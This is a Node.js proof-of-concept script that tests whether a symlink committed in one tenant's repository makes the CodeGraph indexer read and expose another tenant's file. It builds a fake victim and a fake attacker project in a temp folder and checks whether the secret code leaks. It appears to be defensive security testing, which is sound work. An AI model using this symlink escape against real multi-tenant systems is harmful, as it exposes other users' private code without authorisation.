// Can a repo use a symlink to make CodeGraph read a file OUTSIDE its project folder (another tenant's)?
process.env.CODEGRAPH_TELEMETRY = '0';
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');
const { CodeGraph } = require('@colbymchenry/codegraph');

const git = (cwd, ...a) => execFileSync('git', a, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();

(async () => {
  const data = fs.mkdtempSync(path.join(os.tmpdir(), 'astra-symlink-'));
  const victim = path.join(data, 'orgB', 'p1');          // another tenant's project
  const attacker = path.join(data, 'orgA', 'p1');         // the project whose repo contains a symlink
  fs.mkdirSync(victim, { recursive: true });
  fs.mkdirSync(path.join(attacker, 'src'), { recursive: true });
  fs.writeFileSync(path.join(victim, 'secret.ts'), 'export function victimSecretFn() { return "ORG-B-PRIVATE-VALUE"; }\n');
  fs.writeFileSync(path.join(attacker, 'src', 'ok.ts'), 'export function legit() { return 1; }\n');

  const link = path.join(attacker, 'src', 'leak.ts');
  try {
    fs.symlinkSync(path.join('..', '..', '..', 'orgB', 'p1', 'secret.ts'), link, 'file');
  } catch (e) {
    console.log('CANNOT CREATE SYMLINKS on this machine:', e.code, '- live test not possible here (needs Developer Mode/admin on Windows).');
    fs.rmSync(data, { recursive: true, force: true });
    return;
  }
  console.log('symlink created:', fs.lstatSync(link).isSymbolicLink(), '->', fs.readlinkSync(link));

  git(attacker, 'init', '-q', '-b', 'main');
  git(attacker, 'config', 'user.email', 't@t'); git(attacker, 'config', 'user.name', 't'); git(attacker, 'config', 'core.symlinks', 'true');
  git(attacker, 'add', '-A'); git(attacker, 'commit', '-q', '-m', 'x');
  console.log('git sees the entry as mode', git(attacker, 'ls-files', '-s', 'src/leak.ts').split(' ')[0], '(120000 = symlink)');

  (await CodeGraph.init(attacker, { index: true })).close();
  const cg = await CodeGraph.open(attacker, { readOnly: true });
  const hits = cg.searchNodes('victimSecretFn', { limit: 5 }).filter((r) => r.node.name === 'victimSecretFn');
  console.log('\nsymbol from the OTHER tenant indexed into this tenant:', hits.length > 0);
  if (hits.length) {
    const n = hits[0].node;
    console.log('  file path reported:', n.filePath);
    const code = await cg.getCode(n.id);
    console.log('  getCode returns the other tenant\'s source:', code && code.includes('ORG-B-PRIVATE-VALUE'), JSON.stringify((code || '').slice(0, 70)));
  }
  cg.close();
  fs.rmSync(data, { recursive: true, force: true });
})().catch((e) => { console.error('FAILED', e); process.exit(1); });
